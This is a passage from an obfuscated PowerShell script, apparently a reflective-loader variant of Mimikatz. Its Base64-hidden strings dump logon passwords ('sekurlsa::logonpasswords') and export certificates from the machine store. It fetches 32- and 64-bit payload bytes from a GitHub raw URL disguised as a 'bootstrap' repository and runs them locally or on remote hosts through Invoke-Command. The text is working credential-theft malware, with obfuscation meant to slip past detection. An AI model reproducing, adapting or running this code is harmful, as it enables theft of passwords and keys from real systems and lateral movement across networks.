			${/=\/\/=\/===\/=\_} = _/=\/=\_/\/=\_/=== ${/=\/\/=\/===\/=\_} ${_/\__/\_/\_/\_/=\}
			${________/\_/\__/=} = _/=\/=\____/\____/ -_____/====\/\/==\_ ${_/==\_/\/=\/=\/=\_} -___/==\/\/\_______ ${/=\/\/=\/===\/=\_} -Win32Functions$Win32Functions 
		}
		if (${_/==\_/\/=\/=\/=\_} -eq [IntPtr]::Zero)
		{
			____/=\/\/=\/\__/\ -__/\/\/\_/\/=\/=\_ ${__/\/\/\_/\/=\/=\_}
		}
		else
		{
			${_/\/\__/\___/\___} = $Win32Functions.VirtualFree.Invoke(${__/\/\/\_/\/=\/=\_}, [UInt64]0, $Win32Constants.MEM_RELEASE)
			if (${_/\/\__/\___/\___} -eq $false)
			{
				Write-Warning $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABjAGEAbABsACAAVgBpAHIAdAB1AGEAbABGAHIAZQBlACAAbwBuACAAdABoAGUAIABQAEUAJwBzACAAbQBlAG0AbwByAHkALgAgAEMAbwBuAHQAaQBuAHUAaQBuAGcAIABhAG4AeQB3AGEAeQBzAC4A'))) -WarningAction Continue
			}
		}
		Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG4AZQAhAA==')))
	}
	________/\_/\/==\/
}
Function ________/\_/\/==\/
{
	if (($PSCmdlet.MyInvocation.BoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGIAdQBnAA==')))] -ne $null) -and $PSCmdlet.MyInvocation.BoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGIAdQBnAA==')))].IsPresent)
	{
		$DebugPreference  = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AdABpAG4AdQBlAA==')))
	}
	Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFMAaABlAGwAbAAgAFAAcgBvAGMAZQBzAHMASQBEADoAIAAkAFAASQBEAA==')))
	if ($PsCmdlet.ParameterSetName -ieq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RAB1AG0AcABDAHIAZQBkAA=='))))
	{
		${__/\___/\__/===\_/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBlAGsAdQByAGwAcwBhADoAOgBsAG8AZwBvAG4AcABhAHMAcwB3AG8AcgBkAHMAIABlAHgAaQB0AA==')))
	}
    elseif ($PsCmdlet.ParameterSetName -ieq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RAB1AG0AcABDAGUAcgB0AHMA'))))
    {
        ${__/\___/\__/===\_/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwByAHkAcAB0AG8AOgA6AGMAbgBnACAAYwByAHkAcAB0AG8AOgA6AGMAYQBwAGkAIAAiAGMAcgB5AHAAdABvADoAOgBjAGUAcgB0AGkAZgBpAGMAYQB0AGUAcwAgAC8AZQB4AHAAbwByAHQAIgAgACIAYwByAHkAcAB0AG8AOgA6AGMAZQByAHQAaQBmAGkAYwBhAHQAZQBzACAALwBlAHgAcABvAHIAdAAgAC8AcwB5AHMAdABlAG0AcwB0AG8AcgBlADoAQwBFAFIAVABfAFMAWQBTAFQARQBNAF8AUwBUAE8AUgBFAF8ATABPAEMAQQBMAF8ATQBBAEMASABJAE4ARQAiACAAZQB4AGkAdAA=')))
    }
    else
    {
        ${__/\___/\__/===\_/} = $Command
    }
    [System.IO.Directory]::SetCurrentDirectory($pwd)
    ${__/====\____/===\} = New-Object Net.WebClient;
    ${/===\/=\__/===\__} = ${__/====\____/===\}.DownloadString($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcABzADoALwAvAHIAYQB3AC4AZwBpAHQAaAB1AGIAdQBzAGUAcgBjAG8AbgB0AGUAbgB0AC4AYwBvAG0ALwBkAGkAbQBwAG8AbAAvAGIAbwBvAHQAcwB0AHIAYQBwAC8AdgA0AC0AZABlAHYALwBQAEUAYgB5AHQAZQBzADYANQAuAHQAeAB0AA=='))))
    ${__/\/\_/=\/\/\/==} = ${__/====\____/===\}.DownloadString($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcABzADoALwAvAHIAYQB3AC4AZwBpAHQAaAB1AGIAdQBzAGUAcgBjAG8AbgB0AGUAbgB0AC4AYwBvAG0ALwBkAGkAbQBwAG8AbAAvAGIAbwBvAHQAcwB0AHIAYQBwAC8AdgA0AC0AZABlAHYALwBQAEUAYgB5AHQAZQBzADMAMgAuAHQAeAB0AA=='))))
	if ($ComputerName -eq $null -or $ComputerName -imatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBcAHMAKgAkAA=='))))
	{
		icm -ScriptBlock ${__/\/\/=\/\/\_/\/} -ArgumentList @(${/===\/=\__/===\__}, ${__/\/\_/=\/\/\/==}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBvAGkAZAA='))), 0, "", ${__/\___/\__/===\_/})
	}
	else
	{
		icm -ScriptBlock ${__/\/\/=\/\/\_/\/} -ArgumentList @(${/===\/=\__/===\__}, ${__/\/\_/=\/\/\/==}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBvAGkAZAA='))), 0, "", ${__/\___/\__/===\_/}) -ComputerName $ComputerName
	}
}
________/\_/\/==\/
}
